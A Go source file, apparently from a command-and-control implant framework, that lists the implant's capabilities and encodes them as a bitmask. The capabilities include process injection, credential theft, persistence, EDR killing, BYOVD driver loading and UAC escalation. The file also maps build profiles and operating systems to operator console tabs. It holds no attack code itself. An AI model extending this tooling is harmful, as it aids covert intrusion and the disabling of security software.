// Package features 是"载荷里到底编译进去了什么能力"的**唯一事实来源**（v1.4.0 S4）。
//
// 为什么能力必须由构建期决定，而不是服务端按 OS 猜：
//   - 能力是**编译期事实**。`-tags light / bof / evasionscan` 与构建档案（profile）
//     直接决定哪些 .go 文件参与编译（见 internal/server/builder/implant/*.go 的
//     //go:build），没编进去的任务类型在植入端只会回 "未包含在精简构建中" 或
//     "Unknown task type"。
//   - 旧实现（handlers_capabilities.go）只按 `strings.Contains(info.OS,"windows")`
//     推导，于是用 light 档构建的载荷在控制台上照样点满注入/截图/凭据/EDR 按钮 ——
//     操作员点了没反应，会误判成"自己环境的问题"。
//   - 因此本包被三处共用：builder 用它算出位图并烘进载荷；api 用它把上报的位图
//     还原成 tabs/features；老载荷没上报时用它同一份口径做 OS 兜底。
//     "界面上的按钮"与"载荷里的代码"从此同源。
//
// 为什么放在 internal/common（而不是 internal/server 下）：
//   - builder（烘焙位图）与 api（展示 + 兜底）都要 import 本包，common 是两边都
//     允许依赖的最内层，放这里不会形成 server 内部包互相依赖或反向依赖。
//   - 注意植入端模板是**独立 module**（toshell-implant，自带 go.mod），无法 import
//     本包 —— 所以植入端只上报"版本化位图令牌"，能力名表只有服务端这一份，
//     避免两边各维护一份表、迟早与构建期真相漂移。
package features

import (
	"fmt"
	"strings"
)

// ─── 能力键名（与 /sessions/{id}/capabilities 的 features 字段一致）──────────
//
// 这些名字是**对外契约**：前端 tabs 的 key 与它们对齐，改名等于把面板弄丢，
// 所以只允许新增，不允许改名/删除。
const (
	FeatureCommand         = "command"
	FeatureFileList        = "file_list"
	FeatureFileDownload    = "file_download"
	FeatureFileUpload      = "file_upload"
	FeatureFileDelete      = "file_delete"
	FeatureProcessList     = "process_list"
	FeatureProcessKill     = "process_kill"
	FeatureShell           = "shell"
	FeatureSysinfo         = "sysinfo"
	FeatureNetstat         = "netstat"
	FeatureRelay           = "relay"
	FeatureProcessInject   = "process_inject"
	FeatureProcessSpoof    = "process_spoof"
	FeatureAutoInject      = "auto_inject"
	FeatureInjection       = "injection"
	FeatureSpawn           = "spawn"
	FeatureFilelessExec    = "fileless_exec"
	FeaturePersistence     = "persistence"
	FeatureCredentials     = "credentials"
	FeatureScreenshot      = "screenshot"
	FeatureScreenStream    = "screen_stream"
	FeatureAVDetect        = "av_detect"
	FeatureEDRBlind        = "edr_blind"
	FeatureEDRKill         = "edr_kill"
	FeatureByovdLoad       = "byovd_load"
	FeatureByovdUnload     = "byovd_unload"
	FeaturePPLKill         = "ppl_kill"
	FeaturePrivescUAC      = "privesc_uac"
	FeatureBOFLoad         = "bof_load"
	FeaturePluginEXE       = "plugin_exe"
	FeaturePluginDLL       = "plugin_dll"
	FeaturePluginShellcode = "plugin_shellcode"
)

// ─── 操作面板（tabs）键名，与 web/src/components/SessionDetail.tsx 的 TABS 对齐 ───
const (
	TabInfo         = "info"
	TabFiles        = "files"
	TabProcess      = "process"
	TabShell        = "shell"
	TabBOF          = "bof" // 前端"插件"面板：BOF 与 EXE/DLL/shellcode 插件都在这里
	TabRelay        = "relay"
	TabInjection    = "injection"
	TabPersistence  = "persistence"
	TabScreenshot   = "screenshot"
	TabCredentials  = "credentials"
	TabAV           = "av"
	TabFileless     = "fileless"
	TabScreenStream = "screenstream"
)

// bitNames 是"位序 → 能力名"的唯一定义。
//
// ⚠️ **只允许在尾部追加**：已交付载荷的能力位图是按位序烘焙进二进制的，
// 复用位序或重排会让老载荷解出错误能力（比"少显示一个按钮"严重得多）。
// 新增能力请追加到末尾并保持既有顺序不动。
var bitNames = []string{
	FeatureCommand,         // 0
	FeatureFileList,        // 1
	FeatureFileDownload,    // 2
	FeatureFileUpload,      // 3
	FeatureFileDelete,      // 4
	FeatureProcessList,     // 5
	FeatureProcessKill,     // 6
	FeatureShell,           // 7
	FeatureSysinfo,         // 8
	FeatureNetstat,         // 9
	FeatureRelay,           // 10
	FeatureProcessInject,   // 11
	FeatureProcessSpoof,    // 12
	FeatureAutoInject,      // 13
	FeatureInjection,       // 14
	FeatureSpawn,           // 15
	FeatureFilelessExec,    // 16
	FeaturePersistence,     // 17
	FeatureCredentials,     // 18
	FeatureScreenshot,      // 19
	FeatureScreenStream,    // 20
	FeatureAVDetect,        // 21
	FeatureEDRBlind,        // 22
	FeatureEDRKill,         // 23
	FeatureByovdLoad,       // 24
	FeatureByovdUnload,     // 25
	FeaturePPLKill,         // 26
	FeaturePrivescUAC,      // 27
	FeatureBOFLoad,         // 28
	FeaturePluginEXE,       // 29
	FeaturePluginDLL,       // 30
	FeaturePluginShellcode, // 31
}

// maxBits 位图容量（uint64）。当前用到 32 位，留一半给后续能力。
const maxBits = 64

// tabFeatures 是"面板 ← 支撑能力"的映射：只要有一个支撑能力存在，面板就可用。
//
// 这正是本项要修的"点了没反应"：light 档载荷里没有 injection_windows.go，
// 旧实现却因为 OS=windows 把"注入"面板点亮，点下去只会收到
// "进程注入未包含在精简构建中"。
var tabFeatures = []struct {
	Tab      string
	Features []string
}{
	{TabInfo, []string{FeatureSysinfo}},
	{TabFiles, []string{FeatureFileList}},
	{TabProcess, []string{FeatureProcessList}},
	{TabShell, []string{FeatureShell}},
	// 前端"插件"面板同时承载 BOF 与 EXE/DLL/shellcode 插件，任一可用即显示。
	{TabBOF, []string{FeatureBOFLoad, FeaturePluginEXE, FeaturePluginDLL, FeaturePluginShellcode}},
	{TabRelay, []string{FeatureRelay}},
	{TabInjection, []string{FeatureProcessInject, FeatureProcessSpoof, FeatureAutoInject, FeatureInjection, FeatureSpawn}},
	{TabPersistence, []string{FeaturePersistence}},
	{TabScreenshot, []string{FeatureScreenshot}},
	{TabCredentials, []string{FeatureCredentials}},
	{TabAV, []string{FeatureAVDetect}},
	{TabFileless, []string{FeatureFilelessExec}},
	{TabScreenStream, []string{FeatureScreenStream}},
}

// ─── 构建档案 ────────────────────────────────────────────────────────────────

const (
	ProfileFull  = "full"
	ProfileLight = "light"
)

// NormalizeProfile 把外部传入的档案名收敛到已实现的两档，是**构建与能力推导共用的
// 唯一收敛点**。
//
// Fail-closed：未知档案（例如未来才实现的 "nano"、或前端拼错的名字）一律归入 light。
// 为什么必须收敛而不是"照着原样用"：buildTagList 只认字面量 "light"，若这里放行未知
// 档案，`profile=nano` 会编译出 full 载荷、能力推导却按最小集算 —— 两边必须一致，
// 所以宁可在构建时就把未知档案压到最小集（少功能但不撒谎），等真正实现 nano 时
// 在 NormalizeProfile 与 Derive 里各加一条即可。
func NormalizeProfile(profile string) string {
	switch strings.ToLower(strings.TrimSpace(profile)) {
	case ProfileFull, "":
		// 空 = builder 的默认档（full），与 buildTagList 的历史行为一致。
		return ProfileFull
	case ProfileLight:
		return ProfileLight
	default:
		return ProfileLight
	}
}

// ─── 能力推导 ────────────────────────────────────────────────────────────────

// Input 是"载荷构建规格"：字段与 builder.BuildOptions 里决定编译内容的项一一对应。
type Input struct {
	Profile string // 构建档案：full / light（空 = full；未知档案按 light fail-closed）
	// Transport / Protocol 只决定哪个 transport_*.go 进载荷，**不改变任何能力位**；
	// 保留在入参里是为了让调用点显式、可与 buildTagList 入参逐项对照。
	Transport string // 通道类型：tcp / http / websocket / mqtt
	Protocol  string // 原始协议名（tcp / https / ws…）
	BOF       bool   // -tags bof（BOF 兼容层，默认关闭）
	// EvasionScan 只决定反沙箱 timing（gate_scan_windows.go 的 hostDelay）进不进载荷，
	// 是"隐蔽行为"而不是"操作员可见功能"，能力表里没有对应键 —— 显式保留入参，
	// 避免以后误以为"勾了它就该多一个按钮"。
	EvasionScan bool
	// OS：windows / linux / darwin…（**空 = 未知**，按最小集处理，不猜 windows ——
	// builder 会在调用前把空 OS 收敛成它的默认目标 windows，见 capabilityInput）。
	OS   string
	Arch string // amd64 / 386 / arm64（不改变任何能力位，见 Derive 说明）
}

// Derive 计算"按这个构建规格，载荷里真的有什么能力"，结果按位序稳定排序。
//
// 判定依据不是注释，而是模板文件上的 //go:build 约束（逐条核对结果见每个分支的
// 行内注释；核对于 v1.4.0 S4）。判定口径（fail-closed）：
//  1. 该能力的**真实实现**文件参与编译 → 点亮；
//  2. 实现文件带 !light（或它依赖的底层实现带 !light）→ light 档不点亮；
//  3. 该平台只有 "xxx is only supported on Windows" 之类的 stub → 不点亮：
//     宁可不显示面板，也不给操作员一个点了没反应的按钮。
//
// 未知 OS 不 panic：只点亮跨平台基础能力（main.go 恒在）+ 进程枚举/终止
// （platform_unix.go 会为任何非 windows 目标编译），不猜平台专属能力。
func Derive(in Input) []string {
	light := NormalizeProfile(in.Profile) == ProfileLight
	osName := strings.ToLower(strings.TrimSpace(in.OS))
	win := strings.Contains(osName, "windows")
	unix := !win && isUnixOS(osName)

	set := make(map[string]bool, len(bitNames))
	add := func(names ...string) {
		for _, n := range names {
			set[n] = true
		}
	}

	// ── 跨平台基础能力：main.go，无任何 build 约束，任何档案/OS/通道都有 ──
	add(FeatureCommand, FeatureFileList, FeatureFileDownload, FeatureFileUpload,
		FeatureFileDelete, FeatureShell, FeatureSysinfo, FeatureNetstat)
	// 进程枚举/终止：platform_windows.go 与 platform_unix.go 按 windows/!windows 二选一
	// （由 copyImplantSource 挑选并去掉其 build 约束），两者都没有 light 约束。
	add(FeatureProcessList, FeatureProcessKill)

	if !light {
		add(FeatureRelay) // relay.go: //go:build !light
	}

	switch {
	case win:
		// av_detect：main.go 的 detectSecurityProducts（tasklist.exe → 服务端指纹比对），
		// 没有 light 约束 → light 档也有。只在 Windows 点亮：指纹库
		// data/av_fingerprints.json 是 Windows 进程名，别的平台没有可比对的数据。
		add(FeatureAVDetect)
		if !light {
			// 以下全部来自带 "windows && !light" 的文件，light 档里只有
			// features_stub_light.go 的 "未包含在精简构建中" 空实现。
			add(FeatureProcessInject, FeatureProcessSpoof, FeatureAutoInject,
				FeatureInjection, FeatureSpawn) // injection_windows.go
			add(FeaturePersistence)              // persistence_windows.go
			add(FeatureCredentials)              // credentials_windows.go
			add(FeatureScreenshot)               // screenshot_windows.go
			add(FeatureScreenStream)             // screen_stream_windows.go
			add(FeatureEDRBlind, FeatureEDRKill) // edr_windows.go
			// drv_windows.go + drvdetect_windows.go（后者提供 PPL 击杀的句柄窃取）
			add(FeatureByovdLoad, FeatureByovdUnload, FeaturePPLKill)
			add(FeaturePrivescUAC) // uac_windows.go
			// plugin_windows.go（loadEXE / loadDLL / runBlob）
			add(FeaturePluginEXE, FeaturePluginDLL, FeaturePluginShellcode)
			// imgexec_windows.go（runMappedImage）+ blob_windows.go（loadDLLMem）。
			// 注意：light 档下 handleFilelessExec 入口仍在 main.go，四个 kind 里只有
			// kind=dll（blob_windows.go 不带 !light）真的能用，其余三个都是 stub；
			// 半可用按 fail-closed **不点亮**（取舍见 v1.4.0 S4 报告）。
			add(FeatureFilelessExec)
			if in.BOF {
				// bof_windows.go（windows && !light && bof）；不勾选时由
				// bof_stub_windows.go 提供"未编译此功能"的空实现。
				add(FeatureBOFLoad)
			}
		}
	case unix:
		if !light {
			// plugin_unix.go：只有 plugin_exe 是真实现（base64 → 临时文件 → exec）。
			// 同文件的 loadBOF / loadDLL / runBlob 都是 "only supported on Windows"
			// 的 stub；fileless_exec 的四个 kind 在 Unix 也全是 stub（blob_unix.go）。
			// 旧实现按 "unix" 一律点亮这几个，等于给操作员四个必然失败的面板入口。
			add(FeaturePluginEXE)
		}
	}
	return ordered(set)
}

// isUnixOS 判断是否属于"非 windows 的 Unix 家族"。
// 只用于**点亮**平台专属能力：不认识的 OS 不会命中，因此不会误点亮（fail-closed）。
func isUnixOS(osName string) bool {
	for _, k := range []string{
		"linux", "darwin", "macos", "freebsd", "openbsd", "netbsd",
		"dragonfly", "solaris", "illumos", "aix", "android",
	} {
		if strings.Contains(osName, k) {
			return true
		}
	}
	return false
}

// ordered 把能力集合按位序（= bitNames 顺序）输出，保证同一输入永远得到同一顺序，
// 便于单测直接比对切片、也便于前端/日志稳定 diff。
func ordered(set map[string]bool) []string {
	out := make([]string, 0, len(set))
	for _, n := range bitNames {
		if set[n] {
			out = append(out, n)
		}
	}
	return out
}

// Tabs 由能力集合推导可用面板：只返回值为 true 的键（前端按 `capTabs[key] === true` 判断），
// 因此"载荷里没有的能力"不会出现在 tabs 里 —— 这就是本项要修的"点了没反应"。
func Tabs(featureList []string) map[string]bool {
	set := make(map[string]bool, len(featureList))
	for _, f := range featureList {
		set[f] = true
	}
	tabs := make(map[string]bool, len(tabFeatures))
	for _, tf := range tabFeatures {
		for _, f := range tf.Features {
			if set[f] {
				tabs[tf.Tab] = true
				break
			}
		}
	}
	return tabs
}

// ─── 位图编解码（烘焙/上报用）────────────────────────────────────────────────

// TokenPrefix 是能力位图令牌的前缀，带版本号。
//
// 为什么要版本号：位序/extend 需要变化时引入 cap:v2，老服务端遇到不认识的版本会
// fail-closed 回退 OS 推导，而不是按 v1 的位序解出一个**错误**的能力表。
const TokenPrefix = "cap:v1:"

// Bitmask 把能力集合编码成位图。
func Bitmask(featureList []string) uint64 {
	var mask uint64
	for i, n := range bitNames {
		for _, f := range featureList {
			if f == n {
				mask |= 1 << uint(i)
				break
			}
		}
	}
	return mask
}

// Decode 把位图解码成能力集合（按位序）。未知位（比本服务端新的载荷）被忽略，
// 不会 panic、也不会污染输出。
func Decode(mask uint64) []string {
	out := make([]string, 0, len(bitNames))
	for i, n := range bitNames {
		if mask&(1<<uint(i)) != 0 {
			out = append(out, n)
		}
	}
	return out
}

// EncodeToken 生成"本次构建的能力位图令牌"，形如 `cap:v1:0000000000200001`。
// 构建期由 builder 注入模板源码，运行期由植入端随心跳 Modules 上报。
func EncodeToken(in Input) string {
	return TokenPrefix + fmt.Sprintf("%016x", Bitmask(Derive(in)))
}

// ParseToken 解析令牌，返回位图与是否合法。
// 只认精确前缀 + 16 位 hex：格式不对一律返回 false（由调用方兜底），不猜。
func ParseToken(s string) (uint64, bool) {
	s = strings.TrimSpace(s)
	if !strings.HasPrefix(s, TokenPrefix) {
		return 0, false
	}
	hexPart := s[len(TokenPrefix):]
	if len(hexPart) != 16 {
		return 0, false
	}
	var mask uint64
	for i := 0; i < len(hexPart); i++ {
		c := hexPart[i]
		var v uint64
		switch {
		case c >= '0' && c <= '9':
			v = uint64(c - '0')
		case c >= 'a' && c <= 'f':
			v = uint64(c-'a') + 10
		case c >= 'A' && c <= 'F':
			v = uint64(c-'A') + 10
		default:
			return 0, false
		}
		mask = mask<<4 | v
	}
	return mask, true
}

// knownNames 过滤出已知能力名（去重、按位序），用于兼容"直接上报能力名"的植入端。
func knownNames(reported []string) []string {
	set := make(map[string]bool, len(reported))
	for _, r := range reported {
		r = strings.TrimSpace(r)
		if bitIndex(r) >= 0 {
			set[r] = true
		}
	}
	return ordered(set)
}

func bitIndex(name string) int {
	for i, n := range bitNames {
		if n == name {
			return i
		}
	}
	return -1
}

// ─── 会话展示：上报优先 + 老载荷兜底 ────────────────────────────────────────

// Source 说明这份能力清单是"载荷自报的"还是"按 OS 兜底猜的"。
type Source string

const (
	// SourceReported 载荷上报了能力位图（心跳 Modules 里有 cap:v1 令牌）—— 权威。
	SourceReported Source = "reported"
	// SourceOSFallback 载荷没上报（老载荷 / 首心跳还没到）—— 按 OS 推导，**未必等于
	// 载荷真实能力**，响应里必须同时说明这一点，别让操作员把兜底当事实。
	SourceOSFallback Source = "os_fallback"
)

// Resolve 决定"这个会话该显示什么"，是展示层的唯一入口：
//  1. 上报了合法且非全 0 的位图令牌 → 用位图（权威），source=reported；
//  2. 上报了已知能力名（未来 C 植入端/第三方植入端可能直接报名字）→ 用名字，source=reported；
//  3. 都没有 → 按 OS 兜底推导，source=os_fallback。
//
// 全 0 位图按"没上报"处理：任何真实构建都至少有 command/file_list 等基础能力，
// 全 0 只可能来自模板注入失败或伪造 —— 宁可回退 OS 推导，也不显示一个空面板。
func Resolve(reported []string, osName string) ([]string, map[string]bool, Source) {
	for _, m := range reported {
		if mask, ok := ParseToken(m); ok && mask != 0 {
			f := Decode(mask)
			return f, Tabs(f), SourceReported
		}
	}
	if names := knownNames(reported); len(names) > 0 {
		return names, Tabs(names), SourceReported
	}
	f, t := OSFallback(osName)
	return f, t, SourceOSFallback
}

// OSFallback 复刻 v1.4.0 之前 /sessions/{id}/capabilities 的口径：**只按 OS 推导**。
//
// 只用于"载荷没上报能力位"的兜底（老载荷本来就没有位图，不能改口径，否则现在能用的
// 按钮会莫名其妙消失）。这段逻辑**冻结**：不要顺手往里加平台/档案判断，
// 新口径一律走 Derive。
func OSFallback(osName string) ([]string, map[string]bool) {
	lower := strings.ToLower(osName)
	isWin := strings.Contains(lower, "windows")
	isUnix := strings.Contains(lower, "linux") || strings.Contains(lower, "darwin")

	// 基础能力（全平台）
	featureList := []string{
		FeatureCommand, FeatureFileList, FeatureFileDownload, FeatureFileUpload, FeatureFileDelete,
		FeatureProcessList, FeatureProcessKill, FeatureShell, FeatureSysinfo, FeatureNetstat,
	}

	if isWin {
		// Windows 专属
		featureList = append(featureList,
			FeatureProcessInject, FeatureProcessSpoof, FeatureAutoInject, FeatureInjection, FeatureSpawn,
			FeatureFilelessExec, FeaturePersistence, FeatureCredentials, FeatureScreenshot, FeatureScreenStream,
			FeatureAVDetect, FeatureEDRBlind, FeatureEDRKill, FeatureByovdLoad, FeatureByovdUnload, FeaturePPLKill,
			FeaturePrivescUAC, FeatureBOFLoad,
		)
	}
	if isUnix {
		// Unix 通用
		featureList = append(featureList,
			FeatureFilelessExec, FeatureBOFLoad, FeaturePluginEXE, FeaturePluginDLL, FeaturePluginShellcode,
		)
	}
	// 中继能力（与旧实现一致：所有会话都可作为中继，取决于是否已启动）
	featureList = append(featureList, FeatureRelay)

	// 可用操作面板（与前端 TABS 对齐；bof/relay 在旧实现里对所有会话都为 true）
	tabs := map[string]bool{
		TabInfo: true, TabFiles: true, TabProcess: true, TabShell: true,
		TabBOF: true, TabRelay: true,
	}
	if isWin {
		tabs[TabInjection] = true
		tabs[TabPersistence] = true
		tabs[TabScreenshot] = true
		tabs[TabCredentials] = true
		tabs[TabAV] = true
		tabs[TabFileless] = true
		tabs[TabScreenStream] = true
	}
	if isUnix {
		tabs[TabFileless] = true
	}
	return featureList, tabs
}

// SourceNote 是 os_fallback 时随响应返回的说明文案（HTTP 层直接用）。
const SourceNote = "载荷未上报能力位（旧载荷或首心跳未到），当前清单按 OS 兜底推导，" +
	"未必等于载荷真实能力；请以实际构建档案（profile）为准。"
